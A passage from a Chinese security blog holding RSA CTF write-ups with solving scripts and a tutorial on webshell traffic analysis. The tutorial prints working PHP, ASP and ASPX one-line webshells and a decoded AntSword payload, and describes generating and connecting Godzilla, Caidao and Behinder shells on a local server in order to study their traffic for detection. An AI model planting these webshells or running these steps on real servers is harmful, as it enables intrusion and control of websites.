class="line">}</span><br></pre></td></tr></tbody></table></figure><p>扩展欧几里得算法的实现基于裴蜀定理的证明。实质上相当于在做欧几里得算法（普通GCD）的时候对不定方程$ax+by=m$的$x,y$也做了更改。所以经过扩展欧几里得算法处理过的$x,y$就已经是一组合法的可行解了。</p><h1 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h1><p>当n不变的情况下，知道n,e1,e2,c1,c2 可以在不知道d1,d2的情况下，解出m</p><p>假设，e1和e2互质，即$gcd(e1,e2)=1$,则一定有<script type="math/tex">e1 * s1+e2 * s2=1</script>,式中s1,s2均为整数，但是一正一负。</p><p>通过<strong>扩展欧几里得算法</strong>，我们可以的到式子的一组解(s1,s2)，假设s1为正数，s2为负数</p><p>因为</p><script type="math/tex; mode=display">c1=m^{e1}\%n</script><script type="math/tex; mode=display">c2=m^{e2}\%n</script><p>所以</p><script type="math/tex; mode=display">(c1^{s1}*c2^{s2})\%n=( (m^{e1}\%n)^{s1}*(m^{e2}\%n)^{s2})\%n</script><p>根据模运算的性质可以简化为</p><script type="math/tex; mode=display">(c1^{s1}*c2^{s2})\%n=((m^{e1})^{s1}*(m^{e2})^{s2})\%n</script><p>即</p><script type="math/tex; mode=display">(c1^{s1}*c2^{s2})\%n=(m^{e1*s1+e2*s2})\%n</script><p>之前提到<script type="math/tex">e1* s1+e2 *s2=1</script>，所以</p><script type="math/tex; mode=display">(c1^{s1}*c2^{s2})\%n=m\%n</script><p>即</p><script type="math/tex; mode=display">c1^{s1}*c2^{s2}=m</script><p>在数论模运算中，要求一个数的负数次幂，与常规方法并不一样。比如此处要求c2的s2次幂，就要先计算c2的模反元素c2r，然后求c2r的-s2次幂，找到s1的模反元素</p><h1 id="题目——-BJDCTF2020-rsa-output"><a href="#题目——-BJDCTF2020-rsa-output" class="headerlink" title="题目——[BJDCTF2020]rsa_output"></a>题目——[BJDCTF2020]rsa_output</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">{21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111,2767}</span><br><span class="line"></span><br><span class="line">{21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111,3659}</span><br><span class="line"></span><br><span class="line">message1=20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span><br><span class="line"></span><br><span class="line">message2=11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span><br></pre></td></tr></tbody></table></figure><p>有了以上的知识基础，这个题目就迎刃而解了</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span></span><br><span class="line">e1 = <span class="number">2767</span></span><br><span class="line">e2 = <span class="number">3659</span></span><br><span class="line">c1 = <span class="number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span></span><br><span class="line">c2 = <span class="number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span></span><br><span class="line">s = gmpy2.gcdext(e1,e2)</span><br><span class="line"><span class="comment"># s = (mpz(1), mpz(-201), mpz(152))</span></span><br><span class="line">c1=gmpy2.invert(c1,n)</span><br><span class="line">m=(<span class="built_in">pow</span>(c1,-s[<span class="number">1</span>])*<span class="built_in">pow</span>(c2,s[<span class="number">2</span>]))%n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b'BJD{r3a_C0mmoN_moD@_4ttack}'</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webshell的流量特征及解密</title>
      <link href="/2024/01/16/webshell-de-liu-liang-te-zheng/"/>
      <url>/2024/01/16/webshell-de-liu-liang-te-zheng/</url>
      
        <content type="html"><![CDATA[<p><strong>写在前面：</strong></p><p>各位师傅们好，小白刚刚接触这一部分内容，许多地方还是一知半解，写下这篇文章也是为了以后深入学习有个参考。在您阅读的过程中，如果有发现我的错误，希望师傅们可以指出！</p><p><strong>baimi拜谢师傅们！</strong>**</p><h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><p>在很多的渗透过程中，渗透人员会上传一句话木马（<strong>简称Webshell</strong>）到目前<a href="https://so.csdn.net/so/search?q=web%E6%9C%8D%E5%8A%A1&amp;spm=1001.2101.3001.7020">web服务</a>目录继而提权获取系统权限，不论asp、php、jsp、aspx都是如此，那么一句话木马到底是什么呢?</p><p>先来看看最简单的一句话木马：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">'attack'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>【基本原理】利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过中国菜刀chopper.exe即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值。</p><h2 id="入侵条件"><a href="#入侵条件" class="headerlink" title="入侵条件"></a>入侵条件</h2><p>其中，只要攻击者满足三个条件，就能实现成功入侵:</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">（1）木马上传成功，未被杀；</span><br><span class="line">（2）知道木马的路径在哪；</span><br><span class="line">（3）上传的木马能正常运行。</span><br></pre></td></tr></tbody></table></figure><h2 id="常见形式"><a href="#常见形式" class="headerlink" title="常见形式"></a>常见形式</h2><p>常见的一句话木马：</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">php的一句话木马： &lt;?php @eval($_POST['pass']);?&gt;</span><br><span class="line">asp的一句话是：   &lt;%eval request ("pass")%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language="Jscript"%&gt; </span><br><span class="line">    &lt;%eval(Request.Item["pass"],"unsafe");%&gt;</span><br></pre></td></tr></tbody></table></figure><p>我们可以直接将这些语句插入到网站上的某个asp/aspx/php文件上，或者直接创建一个新的文件，在里面写入这些语句，然后把文件上传到网站上即可。</p><h1 id="哥斯拉-Godzilla"><a href="#哥斯拉-Godzilla" class="headerlink" title="哥斯拉(Godzilla)"></a>哥斯拉(Godzilla)</h1><p>下载地址：</p><p><a href="https://github.com/BeichenDream/Godzilla/releases/download/v4.0.1-godzilla/godzilla.jar">https://github.com/BeichenDream/Godzilla/releases/download/v4.0.1-godzilla/godzilla.jar</a></p><p><strong>哥斯拉有多种加密方式，此处仅有PHP</strong></p><h2 id="生成攻击paylode"><a href="#生成攻击paylode" class="headerlink" title="生成攻击paylode"></a>生成攻击paylode</h2><p>打开 <strong>godzilla.jar</strong>，在管理中找到生成，生成一个<strong>攻击payload</strong>，注意填入密码，及加密类型要记好，连接要用</p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240116202031127.png" alt="image-20240116202031127"></p><p>并将其存放在<strong>phpstydy_pro/www目录下</strong></p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240116202334042.png" alt="image-20240116202334042"></p><h2 id="连接webshell"><a href="#连接webshell" class="headerlink" title="连接webshell"></a>连接webshell</h2><p>打开<strong>小皮面板（phpstudy）</strong>，开启<strong>Apache2.4.39</strong>，其他默认即可</p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240116202847831.png" alt="image-20240116202847831"></p><p>在Godzilla.jar的目标中找到<strong>添加</strong></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/1.php</span><br></pre></td></tr></tbody></table></figure><p>测试连接则说明配置成功，添加即可</p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240116203215502.png" alt="image-20240116203215502"></p><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">特征总结：</span><br><span class="line">“pass=”起始。</span><br><span class="line">请求包较长 响应包为0。</span><br><span class="line">一个tcp包里面有三个http，http报文共6个三去三回</span><br></pre></td></tr></tbody></table></figure><p>打开<strong>wireshark</strong>，找到<em><strong>Adapter for loopback traffic capture</strong></em>打开即可，随后在哥斯拉中打开刚才添加的1.php连接，追踪tcp流即可看到</p><h3 id="连接过程请求体"><a href="#连接过程请求体" class="headerlink" title="连接过程请求体"></a>连接过程请求体</h3><p><strong>请求包长度 53767pass=“#####”</strong></p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240116204242574.png" alt="image-20240116204242574"></p><p><strong>响应包长度：0</strong></p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240116204452484.png" alt="image-20240116204452484"></p><p><strong>共6个http报文，三去三回</strong></p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240116204537214.png" alt="image-20240116204537214"></p><h3 id="连接过程响应体："><a href="#连接过程响应体：" class="headerlink" title="连接过程响应体："></a>连接过程响应体：</h3><p>Set-Cookie: PHPSESSID=2ljifouhklemf9kd5olunus7lp; path=/</p><p>Content-Length: 0</p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240116204729126.png" alt="image-20240116204729126"></p><h3 id="命令执行过程请求体："><a href="#命令执行过程请求体：" class="headerlink" title="命令执行过程请求体："></a>命令执行过程请求体：</h3><p>pass=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgA……</p><p>72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488</p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240116205531200.png" alt="image-20240116205531200"></p><h3 id="命令执行过程响应体"><a href="#命令执行过程响应体" class="headerlink" title="命令执行过程响应体"></a>命令执行过程响应体</h3><p>Set-Cookie: PHPSESSID=2hnrph9b01sd41r5fe59u5tdfe; path=/</p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240116205732651.png" alt="image-20240116205732651"></p><h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><p><strong>pass=eval%28base64_decode%28strrev%28urldecode%28</strong></p><p>即base64–&gt;strrec字符串逆序–&gt;url编码</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p><a href="https://www.toolscat.com/decode/url">url在线加解密——开发者在线工具,工具猫 (toolscat.com)</a></p><p><a href="http://gv99.com/text/string2reverse.html">在线字符串反转 - 在线工具 (gv99.com)</a></p><p><a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64 编码/解码 - 在线工具 (toolhelper.cn)</a></p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240116214913096.png" alt="image-20240116214913096"></p><h1 id="中国菜刀-caidao"><a href="#中国菜刀-caidao" class="headerlink" title="中国菜刀(caidao)"></a>中国菜刀(caidao)</h1><h2 id="攻击paylode"><a href="#攻击paylode" class="headerlink" title="攻击paylode"></a>攻击paylode</h2><p>将<strong>shell.php</strong>放在<strong>phpstydy_pro/www/127.0.0.2目录下</strong></p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">123</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="连接webshell-1"><a href="#连接webshell-1" class="headerlink" title="连接webshell"></a>连接webshell</h2><p>打开小皮面板（phpstudy）</p><p><a href="http://127.0.0.2/shell.php">http://127.0.0.2/shell.php</a></p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240117171610627.png" alt="image-20240117171610627"></p><p>成功后就可以开始获取流量包了。</p><h2 id="流量分析-1"><a href="#流量分析-1" class="headerlink" title="流量分析"></a>流量分析</h2><p>在<strong>wireshark</strong>中和哥斯拉操作相同</p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240117173254138.png" alt="image-20240117173254138"></p><p>共4个http报文，两去俩回</p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240117173422611.png" alt="image-20240117173422611"></p><p>菜刀会伪造 X-Forwarded-For 头，且每一次利用菜刀与webshell建立连接，X-Forwarded-For 都 会变化 </p><h2 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h2><p>将这段 post 请求先进行 url 解码，根据途中断断续续的base64提示，再进行base64解码</p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240117173737114.png" alt="image-20240117173737114"></p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240117173753459.png" alt="image-20240117173753459"></p><h1 id="蚁剑（AntSword）"><a href="#蚁剑（AntSword）" class="headerlink" title="蚁剑（AntSword）"></a>蚁剑（AntSword）</h1><h2 id="攻击paylode-1"><a href="#攻击paylode-1" class="headerlink" title="攻击paylode"></a>攻击paylode</h2><p>延用菜刀的即可</p><h2 id="连接webshell-2"><a href="#连接webshell-2" class="headerlink" title="连接webshell"></a>连接webshell</h2><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240117175737433.png" alt="image-20240117175737433"></p><p>成功后就可以开始获取流量包了。</p><h2 id="流量分析-2"><a href="#流量分析-2" class="headerlink" title="流量分析"></a>流量分析</h2><p>蚁剑流量特征两大特征</p><p>​    1、默认的 user-agent 请求头是 antsword xxx（可修改）</p><p>​    2、蚁剑的正文内容用URL加密，解密后流量最中明显的特征为ini_set(“display_errors”,”0”);</p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240117175721277.png" alt="image-20240117175721277"></p><h2 id="解密-2"><a href="#解密-2" class="headerlink" title="解密"></a>解密</h2><p>url解密</p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240117180432662.png" alt="image-20240117180432662"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">@ini_set("display_errors", "0");</span><br><span class="line">@set_time_limit(0);$opdir=@ini_get("open_basedir");</span><br><span class="line">if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.9238c7c";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i&lt;sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "bd43"."12f2";echo @asenc($output);echo "36f352"."e43b47";}ob_start();try{$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);$R="{$D}";if(substr($D,0,1)!="/"){foreach(range("C","Z")as $L)if(is_dir("{$L}:"))$R.="{$L}:";}else{$R.="/";}$R.="";$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";$s=($u)?$u["name"]:@get_current_user();$R.=php_uname();$R.="{$s}";echo $R;;}catch(Exception $e){echo "ERROR://".$e-&gt;getMessage();};asoutput();die();</span><br></pre></td></tr></tbody></table></figure><p>查看其代码发现有多个危险函数使用，如@ini_set(“display_errors”,“0”)、dirname、get_current_user等，如果再文中发现其他编码的明显特征，要进行二次解码</p><h1 id="冰蝎-Behinder"><a href="#冰蝎-Behinder" class="headerlink" title="冰蝎(Behinder)"></a>冰蝎(Behinder)</h1><p>下载地址</p><p><a href="https://github.com/rebeyond/Behinder/releases">Releases · rebeyond/Behinder (github.com)</a></p><h2 id="生成攻击paylode-1"><a href="#生成攻击paylode-1" class="headerlink" title="生成攻击paylode"></a>生成攻击paylode</h2><p>打开<strong>Behinde.jar</strong>，菜单栏有传输协议，选择协议default_XOR_base64，即可生成shell.php和shell.jsp文件</p><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240117184421473.png" alt="image-20240117184421473"></p><p>把shell.php复制到<strong>phpstydy_pro/www/127.0.0.2目录下</strong></p><h2 id="连接webshell-3"><a href="#连接webshell-3" class="headerlink" title="连接webshell"></a>连接webshell</h2><p><img src="/2024/01/16/webshell-de-liu-liang-te-zheng/image-20240117184552299.png" alt="image-20240117184552299"></p><p>成功后就可以开始获取流量包了。</p><h2 id="流量分析-3"><a href="#流量分析-3" class="headerlink" title="流量分析"></a>流量分析</h2><p>Accept: application/json, text/javascript, <em>/</em>; q=0.01</p><p>Content-type: Application/x-www-form-urlencoded</p><p>PHP webshell中存在固定代码</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">Decrypt</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">"php://input"</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$post</span>);</span><br></pre></td></tr></tbody></table></figure><p>冰蝎通讯默认使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection。</p><p>Connection: Keep-Alive</p><p>请求字节头：</p><p>dFAXQV1LORcHRQtLRlwMAhwFTAg/M</p><p>响应字节头：</p><p>TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</p><p>默认时，所有冰蝎4.0 webshell都有“e45e329feb5d925b” 一串密钥。该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</p><h2 id="解密-3"><a href="#解密-3" class="headerlink" title="解密"></a>解密</h2><p><a href="http://tools.bugscaner.com/cryptoaes/">AES批量加密解密 - 在线工具 (bugscaner.com)</a></p><p><a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64 编码/解码 - 在线工具 (toolhelper.cn)</a></p><p>参考文章：</p><p><a href="https://www.freebuf.com/articles/network/345803.html">https://www.freebuf.com/articles/network/345803.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/575575239">https://zhuanlan.zhihu.com/p/575575239</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound#16_Crypto</title>
      <link href="/2024/01/15/nssround-16-crypto/"/>
      <url>/2024/01/15/nssround-16-crypto/</url>
      
        <content type="html"><![CDATA[<h1 id="pr"><a href="#pr" class="headerlink" title="pr"></a>pr</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">提示：CRT</span><br></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag=plaintext = <span class="string">'NSSCTF{****************}'</span></span><br><span class="line">charset = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span></span><br><span class="line">padding_length = <span class="number">100</span> - <span class="built_in">len</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(padding_length):</span><br><span class="line">    plaintext += random.choice(charset)</span><br><span class="line"></span><br><span class="line">public_exponent = <span class="number">31413537523</span></span><br><span class="line">message = bytes_to_long(plaintext.encode())</span><br><span class="line"><span class="keyword">assert</span> message &gt; (<span class="number">1</span> &lt;&lt; <span class="number">512</span>)</span><br><span class="line"><span class="keyword">assert</span> message &lt; (<span class="number">1</span> &lt;&lt; <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">prime_p = getPrime(<span class="number">512</span>)</span><br><span class="line">prime_q = getPrime(<span class="number">512</span>)</span><br><span class="line">prime_r = getPrime(<span class="number">512</span>)</span><br><span class="line">n1 = prime_p * prime_q</span><br><span class="line">n2 = prime_q * prime_r</span><br><span class="line">ciphertext1 = <span class="built_in">pow</span>(message, public_exponent, n1)</span><br><span class="line">ciphertext2 = <span class="built_in">pow</span>(message, public_exponent, n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'c1='</span>, ciphertext1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'c2='</span>, ciphertext2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'p='</span>, prime_p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'r='</span>, prime_r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">c1= 36918910341116680090654563538246204134840776220077189276689868322808977412566781872132517635399441578464309667998925236488280867210758507758915311644529399878185776345227817559234605958783077866016808605942558810445187434690812992072238407431218047312484354859724174751718700409405142819140636116559320641695</span></span><br><span class="line"><span class="string">c2= 15601788304485903964195122196382181273808496834343051747331984997977255326224514191280515875796224074672957848566506948553165091090701291545031857563686815297483181025074113978465751897596411324331847008870832527695258040104858667684793196948970048750296571273364559767074262996595282324974180754813257013752</span></span><br><span class="line"><span class="string">p= 12101696894052331138951718202838643670037274599483776996203693662637821825873973767235442427190607145999472731101517998719984942030184683388441121181962123</span></span><br><span class="line"><span class="string">r= 10199001137987151966640837133782537428248507382360655526592866939552984259171772190788036403425837649697437126360866173688083643144865107648483668545682383</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></tbody></table></figure><p>分析题目，生成了512位大素数p,q,r</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">n1 = p * q</span><br><span class="line">n2 = q * r</span><br></pre></td></tr></tbody></table></figure><p>密文如下：</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">c1 = m ** e (mod n1)</span><br><span class="line">c2 = m ** e (mod n2)</span><br></pre></td></tr></tbody></table></figure><p>附件数据给了密文c1,c2和p,r，求m</p><p>由于n1和n2有公因子q，根据同余的性质，可以转换为以下形式(此处用到性质3.3)</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">c1 = m ** e (mod p)</span><br><span class="line">c2 = m ** e (mod r)</span><br></pre></td></tr></tbody></table></figure><p>附：[同余的性质](<a href="https://baike.baidu.com/item/%E5%90%8C%E4%BD%99%E5%9F%BA%E6%9C%AC%E6%80%A7%E8%B4%A8/18913295">同余基本性质_百度百科 (baidu.com)</a>)，内容来自百度百科</p><p><img src="/2024/01/15/nssround-16-crypto/image-20240115233134474.png" alt="image-20240115233134474"></p><p>根据题目的CRT就可以得到：</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">c = m ** e (mod pr)</span><br></pre></td></tr></tbody></table></figure><p>然后由于flag只填充到100字节，所以就800bit左右，在模pr下一定能解出明文</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c1= <span class="number">36918910341116680090654563538246204134840776220077189276689868322808977412566781872132517635399441578464309667998925236488280867210758507758915311644529399878185776345227817559234605958783077866016808605942558810445187434690812992072238407431218047312484354859724174751718700409405142819140636116559320641695</span></span><br><span class="line">c2= <span class="number">15601788304485903964195122196382181273808496834343051747331984997977255326224514191280515875796224074672957848566506948553165091090701291545031857563686815297483181025074113978465751897596411324331847008870832527695258040104858667684793196948970048750296571273364559767074262996595282324974180754813257013752</span></span><br><span class="line">p= <span class="number">12101696894052331138951718202838643670037274599483776996203693662637821825873973767235442427190607145999472731101517998719984942030184683388441121181962123</span></span><br><span class="line">r= <span class="number">10199001137987151966640837133782537428248507382360655526592866939552984259171772190788036403425837649697437126360866173688083643144865107648483668545682383</span></span><br><span class="line">e  = <span class="number">31413537523</span></span><br><span class="line"></span><br><span class="line">n = [p,r]</span><br><span class="line">c = [c1,c2]</span><br><span class="line">M = crt(n,c)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(M,d,p*r)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#NSSCTF{yUanshEnx1ncHun2o23!}</span></span><br></pre></td></tr></tbody></table></figure><h1 id="break"><a href="#break" class="headerlink" title="break"></a>break</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">パスワード(文件名)</span><br><span class="line">6081370370545409218106271903400346695565292992689150366474451604281551878507114813906275593034729563149286993189430514737137534129570304832172520820901940874698337733991868650159489601159238582002010625666203730677577976307606665760650563172302688129824842780090723167480409842707790983962415315804311334507726664838464859751689906850572044873633896253285381878416855505301919877714965930289139921111644393144686543207867970807469735534838601255712764863973853116693691206791007433101433703535127367245739289103650669095061417223994665200039533840922696282929063608853551346533188464573323230476645532002621795338655</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">pri-break.pem</span><br><span class="line">Bc8tSTrvGJm2oYuCzIz+Yg4nwwKBgQDiYUawe5Y+rPbFhVOMVB8ZByfMa4LjeSDd</span><br><span class="line">Z23jEGvylBHSeyvFCQq3ISUE40k1D2XmmeaZML3a1nUn6ORIWGaG2phcwrWLkR6n</span><br><span class="line">ubVmb1QJSzgzmFHGnL56KHByZxD9q6DPB+o6gGWt8/6ddBl2NIZU/1btdPQgojfA</span><br><span class="line">XXJFzR92RQKBgQC7qlB0U7m2U4FdG9eelSd+WSKNUVllZAuHji7jgh7Ox6La9xN5</span><br><span class="line">miGZ1yvP44yX218OJ9Zi08o6vIrM6Eil45KzTtGm4iuIn8CMpox+5eUtoxyvxa9r</span><br><span class="line">s2Wu+IRZN9zCME+p+qI8/TG27dIyDzsdgNqcUo8ESls7uW5/FEA7bYTCiQKBgQC7</span><br><span class="line">1KybeB+kZ0zlfIdi8tVOpeI+uaHDbdh3+/5wHUsD3hmfg7VAag0q/2RA1vkB/oG1</span><br><span class="line">QVLVHl0Yu0I/1/u5jyeakrtClAegAsvlrK+3i321rGS4YpTPb3SX1P/f3GZ7o7Ds</span><br><span class="line">touA+NHk8IL9T7xkmJYw5h/RLG32ucH6aU6MXfLR5QKBgD/skfdFxGWxhHk6U1mS</span><br><span class="line">27IM9jJNg9xLz5nxzkqPPhLn+rdgIIuTuQtv++eEjEP++7ZV10rg5yKVJd/bxy8H</span><br><span class="line">2IN7aQo7kZWulHTQDZMFwgOhn0u6glJi+qC8bWzYDFOQSFrY9XQ3vwKMspqm+697</span><br><span class="line">xM+dMUW0LML6oUE9ZjEiAY/5</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></tbody></table></figure><p>题目给了私钥的一部分，之前刚好看过”手撕私钥”，这里可以参考这篇文章：</p><p><a href="https://tover.xyz/p/pem-by-hand/#RSA%E7%A7%81%E9%92%A5">手撕PEM密钥（RSA） | Tover’ 